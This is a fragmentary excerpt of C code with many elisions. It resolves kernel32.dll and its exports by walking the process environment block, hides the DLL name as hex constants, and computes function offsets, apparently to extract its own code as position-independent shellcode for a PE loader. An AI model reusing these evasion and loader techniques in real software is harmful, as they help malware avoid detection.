...
} CUS_LDR_MODULE, *PCUS_LDR_MODULE;

wchar_t Mytowupper(wchar_t wc) {
    // Check if the character is a lowercase letter
    if (wc >= L'a' && wc <= L'z') {
        return wc - (L'a' - L'A'); // Convert to uppercase
    }
    return wc; // Return the character unchanged if not lowercase
}

char AnsiWideStringCompare(wchar_t * src, char * dest){
	while( (*src!=0) && (*dest !=0) ){
		
		if(*src != Mytowupper(((wchar_t)*dest))){
			return 0;
		}
...
LPVOID GetKernelAndProc(LPVOID * dll){
	...
	* dll = tempDll =((PCUS_LDR_MODULE)(  (LPVOID) teb->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink - FIELD_OFFSET(CUS_LDR_MODULE,InMemoryOrderModuleList) ))->BaseAddress;
...
*/
LPVOID GetKernelAndProcV2(LPVOID * dll){
    PPEB peb =(PPEB) __readgsqword(0x60);
    LIST_ENTRY * node = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY * end = &peb->Ldr->InMemoryOrderModuleList;
    
    char fname [16];
    LPVOID tempDll = NULL, FuncAddr = NULL;


    *((DWORD *) fname ) = 0x6e72656b; // 'kern'
    *((DWORD *) (fname + 4)) = 0x32336c65; // 'el32'
    *((DWORD *) (fname + 8)) = 0x6c6c642e; // '.dll'
    *((WORD *) (fname + 12)) = 0x1111 ^ 0x1111; // NULL

    //printf("%s\n",fname);
    while (node != end)
    {
        PCUS_LDR_MODULE module = (PCUS_LDR_MODULE)(((void *)node) - FIELD_OFFSET(CUS_LDR_MODULE,InMemoryOrderModuleList));
        
        if(AnsiWideStringCompare(module->BaseDllName.Buffer,fname)){
            * dll = tempDll = module->BaseAddress;
        }
    ...
    if (tempDll)
    {
        ...
        *(PWORD)(&fname[14]) = 0x7373 ^ 0x7373; //NULL
        ...
        for (; i < exp->NumberOfNames; i++)
        {
            ...
            if (found)
            {
                FuncAddr = tempDll + AddressOFunc[AddressOfOrd[i]];
            }
        }
    }
...
LPVOID CopyData(LPVOID rawData){
	...
	GetProcAddr = GetKernelAndProcV2(&dll);
...
int main(int j,char **args){
	...
	DWORD SLEN = (DWORD )( (UINT_PTR)main - (UINT_PTR)Mytowupper);
	DWORD CopyDataIndex = (DWORD )( (UINT_PTR)CopyData - (UINT_PTR)Mytowupper);
	DWORD SetupIndex = (DWORD )( (UINT_PTR)SetupPE - (UINT_PTR)Mytowupper);
	...
	unsigned char * p = (unsigned char *)Mytowupper;
